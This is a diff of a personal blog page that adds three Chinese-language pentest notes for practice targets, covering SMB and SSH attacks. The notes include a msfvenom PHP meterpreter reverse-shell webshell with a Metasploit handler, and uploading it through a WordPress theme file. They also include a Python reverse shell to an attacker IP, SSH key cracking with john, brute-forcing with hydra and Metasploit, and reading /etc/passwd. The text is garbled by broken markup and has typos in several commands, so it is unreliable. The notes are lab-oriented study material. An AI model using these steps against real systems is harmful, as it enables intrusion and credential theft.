@@ -264,6 +264,475 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/Smb (server message block)信息泄露/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/24/Smb (server message block)信息泄露/" itemprop="url">smb服务</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-24T11:06:59+08:00">
+                2019-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Smb-server-message-block-信息泄露"><a href="#Smb-server-message-block-信息泄露" class="headerlink" title="Smb (server message block)信息泄露"></a>Smb (server message block)信息泄露</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><figure class="highlight plain"><figcaption><span>-sV ip ```探测服务信息</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```namp -A -v -T4 ip``` 靶场全部信息,最大线程</span><br><span class="line"></span><br><span class="line">### 分析结果</span><br><span class="line"></span><br><span class="line">#### smb 弱点</span><br><span class="line"></span><br><span class="line">1. 空口令登录</span><br><span class="line"></span><br><span class="line">   ```smbclient -L ip</span><br></pre></td></tr></table></figure>
+   <figure class="highlight plain"><figcaption><span>'\\ip\print$'```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```smbclient &apos;\\ip\share$&apos;</span><br></pre></td></tr></table></figure>
+<p>   get 敏感文件</p>
+<ol start="2">
+<li><p>远程溢出漏洞分析</p>
+<figure class="highlight plain"><figcaption><span>asmba 查看版本号```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   ## 针对http协议</span><br><span class="line"></span><br><span class="line">   1. 浏览器查看网站</span><br><span class="line">   2. 使用 dirb nikto探测</span><br><span class="line">   3. 寻找突破口,后台,传shell</span><br><span class="line"></span><br><span class="line">## 制作webshell</span><br><span class="line"></span><br><span class="line">```msfcvenom -p php/meterpreter/reverse_tcp lhost=攻击ip lhost=4444 -f raw &gt; /root/Desktop/shell.php</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hander</span><br><span class="line">msf exploit(hander) &gt; set payload php/merterpreter/reverse_tcp</span><br><span class="line">msf exploit(hander) &gt; set host 攻击ip</span><br><span class="line">msf exploit(hander) &gt; set lport 4444</span><br><span class="line">msf exploit(hander) run</span><br></pre></td></tr></table></figure>
+<h2 id="上传webshell"><a href="#上传webshell" class="headerlink" title="上传webshell"></a>上传webshell</h2><p>找到敏感点</p>
+<p>wordpress 上传点 theme 404.php</p>
+<p>执行 <a href="http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php" target="_blank" rel="noopener">http://ip/wordpress/wp-contentthemes/twentyfourteen/404.php</a></p>
+<h2 id="优化终端"><a href="#优化终端" class="headerlink" title="优化终端"></a>优化终端</h2><figure class="highlight python"><figcaption><span>-c 'import pty;pty.spawn("/bin/bash")'```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查找用户名 ```cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>在共享资源查找敏感文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">su 用户名</span><br><span class="line">sudo -l </span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/ssh泄露/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/24/ssh泄露/" itemprop="url">ssh泄露</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-24T11:06:59+08:00">
+                2019-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="ssh泄露"><a href="#ssh泄露" class="headerlink" title="ssh泄露"></a>ssh泄露</h1><h3 id="探测靶场ip"><a href="#探测靶场ip" class="headerlink" title="探测靶场ip"></a>探测靶场ip</h3><p>netdiscover -r ip/netmask</p>
+<h3 id="测试连通性"><a href="#测试连通性" class="headerlink" title="测试连通性"></a>测试连通性</h3><p>ping ip</p>
+<h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><h3 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h3><p>nmap -sV ip</p>
+<p>dirb <a href="http://ip:port" target="_blank" rel="noopener">http://ip:port</a> 对隐藏文件探测</p>
+<h2 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h2><ul>
+<li>ssh -i id_ras  user@host</li>
+</ul>
+<ul>
+<li><p>ssh2john id_rsa &gt; rsacrack 将私钥转换为john可以阅读的模式</p>
+</li>
+<li><p>zcat  /user/share/wordlist/rockyou.txt.gx | john – pipe –rules rascrack</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>find  / -perm - 4000 2&gt;/dev/null(错误输出倒空)</p>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/ssh服务/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/24/ssh服务/" itemprop="url">ssh服务</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-24T11:06:59+08:00">
+                2019-08-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h1><h2 id="协议弱点"><a href="#协议弱点" class="headerlink" title="协议弱点"></a>协议弱点</h2><h3 id="基于口令"><a href="#基于口令" class="headerlink" title="基于口令"></a>基于口令</h3><p>用字典宝暴力破解</p>
+<h3 id="基于秘钥"><a href="#基于秘钥" class="headerlink" title="基于秘钥"></a>基于秘钥</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa user@host</span><br></pre></td></tr></table></figure>
+<h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><h3 id="开放服务"><a href="#开放服务" class="headerlink" title="开放服务"></a>开放服务</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV ip</span><br></pre></td></tr></table></figure>
+<h3 id="全部信息"><a href="#全部信息" class="headerlink" title="全部信息"></a>全部信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -v ip</span><br></pre></td></tr></table></figure>
+<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><figure class="highlight plain"><figcaption><span>-O ip ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 挖掘敏感信息</span><br><span class="line"></span><br><span class="line">```nikto -host ip</span><br></pre></td></tr></table></figure>
+<h2 id="扩大战果"><a href="#扩大战果" class="headerlink" title="扩大战果"></a>扩大战果</h2><ol>
+<li>查看当前用户 whoami</li>
+<li>ID查看用户权限</li>
+<li>查看根目录 寻找flag</li>
+</ol>
+<h3 id="查看配置信息"><a href="#查看配置信息" class="headerlink" title="查看配置信息"></a>查看配置信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd 查看用户列表</span><br><span class="line">cat /etc/group 查看用户组</span><br><span class="line">cat / -user 查看属于某个用户的文件</span><br><span class="line">/tmp 查看缓冲区文件</span><br></pre></td></tr></table></figure>
+<h3 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h3><figure class="highlight plain"><figcaption><span>```用户任务编辑,定时执行</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 反弹shell</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
+<p>#!/user/bin/python<br>import os,subprocess,socket</p>
+<p>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“攻击机ip”,port))<br>//返回输出信息<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p = subprocess.call([“/bin/sh”,”-i”])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### nc</span><br><span class="line"></span><br><span class="line">```nc -lpv ```未占用端口</span><br><span class="line"></span><br><span class="line">查看占用端口 ```netstat -pantu``</span><br><span class="line"></span><br><span class="line">### 暴力破解</span><br><span class="line"></span><br><span class="line">hydra , medusa</span><br><span class="line"></span><br><span class="line">字典``` git clone https://github.com/jeanphorn/common-passwod.git```</span><br><span class="line"></span><br><span class="line">```./cupp.py -i ```已交互方式创建字典</span><br><span class="line"></span><br><span class="line">### metasploit</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">``````shell</span><br><span class="line">msf&gt;use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(ssh_login) &gt; shoe options</span><br><span class="line">msf auxiliary(ssh_login) &gt; set rhost ip</span><br><span class="line">msf auxiliary(ssh_login) &gt; set username name</span><br><span class="line">msf auxiliary(ssh_login) &gt; set pass_file name.txt</span><br><span class="line">msf auxiliary(ssh_login) &gt; set threads 5</span><br><span class="line">msf auxiliary(ssh_login) &gt; run</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
+<p>优化会话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">su -root</span><br></pre></td></tr></table></figure>
+<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p><code>cat flag.txt</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://newird.github.io/2018/09/22/nc/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -596,7 +1065,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -607,7 +1076,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -618,7 +1087,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -691,7 +1160,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
